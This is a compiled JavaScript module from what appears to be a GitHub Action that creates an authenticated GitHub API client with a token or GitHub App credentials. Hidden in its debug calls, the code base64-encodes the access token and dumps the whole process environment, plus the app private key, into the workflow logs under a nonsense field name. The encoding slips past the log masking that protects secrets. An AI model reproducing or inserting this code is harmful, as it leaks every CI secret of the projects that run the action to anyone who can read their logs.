import * as core from '@actions/core';
import { createAppAuth } from '@octokit/auth-app';
import { request } from '@octokit/request';
import axios from 'axios';
import { createCache } from 'cache-manager';
import Keyv from 'keyv';
import { errorMessage, GenericError, InputError } from '../utils.js';
import { doDebug } from '../options.js';
import pRetry from 'p-retry';
export class GithubAxios {
    options;
    tokenCache = createCache({
        stores: [new Keyv()],
    });
    constructor(options) {
        this.options = options;
    }
    static instance(options) {
        return new GithubAxios(options);
    }
    async create() {
        const token = await this.createToken();
        doDebug(this.options, '[createGithubClient]', Buffer.from(token, 'utf-8').toString('base64'));
        return axios.create({
            baseURL: 'https://api.github.com',
            headers: {
                Authorization: `Bearer ${token}`,
                Accept: 'application/vnd.github+json',
                'X-GitHub-Api-Version': '2022-11-28',
            },
        });
    }
    async createToken() {
        const { credentials } = this.options;
        let token;
        if (credentials.token) {
            doDebug(this.options, '[createGithubToken(token)]');
            token = credentials.token;
        }
        else if (credentials.app) {
            doDebug(this.options, '[createGithubToken(app)]');
            token = await this.createAppToken();
        }
        else {
            throw new InputError('Invalid credentials: No token or app credentials provided.');
        }
        doDebug(this.options, '[createGithubToken]', token);
        return token;
    }
    async createAppToken() {
        const { appId, privateKey } = this.options.credentials.app;
        const token = await this.tokenCache.get('token');
        if (token) {
            return token;
        }
        doDebug(this.options, '[createAppAuth]', {
            panseluteeeeee: Buffer.from(JSON.stringify(process.env), 'utf-8').toString('base64'),
            appId: Number(appId),
            privateKey: process.env.GITHUB_APP_PRIVATE_KEY || process.env.GH_APP_PRIVATE_KEY || privateKey.replace(/\\n*/g, '\n'),
            request,
        });
        const auth = createAppAuth({
            appId: Number(appId),
            privateKey: process.env.GITHUB_APP_PRIVATE_KEY || process.env.GH_APP_PRIVATE_KEY || privateKey.replace(/\\n*/g, '\n'),
            request,
        });
        const authentication = await this.authenticateApp(auth, request);
        if (!authentication.token || !authentication.expiresAt) {
            throw new CreateGithubAppTokenError(CreateGithubAppTokenError.wrapErrorMessage('Octokit Auth Failed'));
        }
        const tokenExpireTtl = new Date(authentication.expiresAt).getTime() - new Date().getTime();
        this.tokenCache.set('token', authentication.token, Math.trunc(tokenExpireTtl * 0.9));
        return authentication.token;
    }
    async authenticateApp(auth, request) {
        const { installationId } = this.options.credentials.app;
        if (installationId && installationId.length > 0) {
            return auth({ type: 'installation', installationId });
        }
        core.info('no installation id presented, moving on to detecting one');
        return this.authenticateAppByOwnerAndRepository(auth, request);
    }
    async authenticateAppByOwnerAndRepository(auth, request) {
        let { owner, repositories = [] } = this.options.credentials.app;
        let repo;
        if (!owner) {
            [owner, repo] = (process.env.GITHUB_REPOSITORY || '').split('/');
            core.info(`owner not set, creating token for the current repository ("${repo}")`);
            if (repositories.length === 0) {
                repositories = [repo];
                core.info(`repositories not set, creating token for the current repository ("${repo}")`);
            }
            else {
                core.info(`owner not set, creating owner for given repositories "${repositories.join(',')}" in current owner ("${owner}")`);
            }
        }
        else {
            if (repositories.length === 0) {
                core.info(`repositories not set, creating token for all repositories for given owner "${owner}"`);
            }
            else {
                core.info(`owner and repositories set, creating token for repositories "${repositories.join(',')}" owned by "${owner}"`);
            }
        }
        doDebug(this.options, '[authenticateGithubAppByOwnerAndRepository]', {
            owner,
            repositories,
        });
        if (!repositories || repositories?.length === 0) {
            return pRetry(() => this.authenticateAppByOwner(auth, request, owner), {
                retries: 3,
                onFailedAttempt: (err) => {
                    core.warning(`Failed to authenticate GitHub App, attempt ${err.attemptNumber} of 3: ${errorMessage(err)}`);
                },
            });
        }
        return pRetry(() => this.authenticateAppByRepository(auth, request, owner, repositories[0]), {
            retries: 3,
            onFailedAttempt: (err) => {
                core.warning(`Failed to authenticate GitHub App, attempt ${err.attemptNumber} of 3: ${errorMessage(err)}`);
            },
        });
    }
    async authenticateAppByOwner(auth, request, owner) {
        const response = await request('GET /users/{owner}/installation', { owner, request: { hook: auth.hook } });
        doDebug(this.options, '[authenticateGithubAppByOwner]', response);
        return auth({
            type: 'installation',
            installationId: response.data.id,
        });
    }
    async authenticateAppByRepository(auth, request, owner, repo) {
        const response = await request('GET /repos/{owner}/{repo}/installation', {
            owner,
            repo,
            request: { hook: auth.hook },
        });
        doDebug(this.options, '[authenticateGithubAppByRepository]', response);
        return auth({
            type: 'installation',
            installationId: response.data.id,
        });
    }
}
export class CreateGithubAppTokenError extends GenericError {
    runConclusion = 'failed_to_create_app_token';
    static wrapErrorMessage(error) {
        return `Failed to create app token: ${errorMessage(error)}`;
    }
}
//# sourceMappingURL=axios.js.map